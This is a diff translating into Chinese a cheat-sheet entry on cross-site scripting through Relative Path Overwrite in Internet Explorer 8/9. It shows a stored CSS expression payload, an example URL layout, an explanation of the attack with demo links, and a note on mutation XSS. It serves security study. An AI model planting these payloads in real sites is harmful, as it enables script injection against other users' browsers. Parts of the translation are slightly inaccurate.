@@ -1,14 +1,14 @@
 # XSS with Relative Path Overwrite - IE 8/9 and lower
 
-You need these 3 components
+你需要这三个组件
 
 ```javascript
-1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))}
-2) URL Rewriting.
-3) Relative addressing to CSS style sheet : ../style.css
+1) 允许CSS注入的XSS存储. : {}*{xss:expression(open(alert(1)))}
+2) URL重写.
+3) CSS样式表的相对寻址 : ../style.css
 ```
 
-A little example
+一个小的例子
 
 ```html
 http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
@@ -23,10 +23,11 @@ Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
 </html>
 ```
 
-Explanation of the vulnerability
+漏洞的说明
 
-> The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert.
-> A simple request of “rpo.php/” makes the relative style load the page itself as a style sheet. The actual request is “/labs/xss_horror_show/chapter7/rpo.php/styles.css” the browser thinks there’s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.
+> 母体元素会强制IE的文档模式兼容IE7 ，这是执行表达式所必需的。在一个现实的场景中，它可能是一个配置文件页面，或者可能是一个共享的状态更新，这些其他用户都可以看到。我们使用“open”来防止客户端DoS重复执行警报。 
+>
+> 一个简单的“rpo.php/” 的请求使相对样式将页面本身作为样式表加载。实际的请求是“/labs/xss_horror_show/chapter7/rpo.php/styles.css” 浏览器认为存在另一个目录，但实际的请求被发送到文档，这实际上就是RPO攻击的工作方式。
 
 Demo 1 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php`
 Demo 2 at `http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3`
@@ -41,7 +42,7 @@ From : `http://www.thespanner.co.uk/2014/03/21/rpo/`
 <script>alert(document.getElementById('x').innerHTML)</script>
 ```
 
-IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.
+IE将多次读写(解码)HTML，攻击者XSS有效载荷将发生变化并执行。
 
 
 ## References
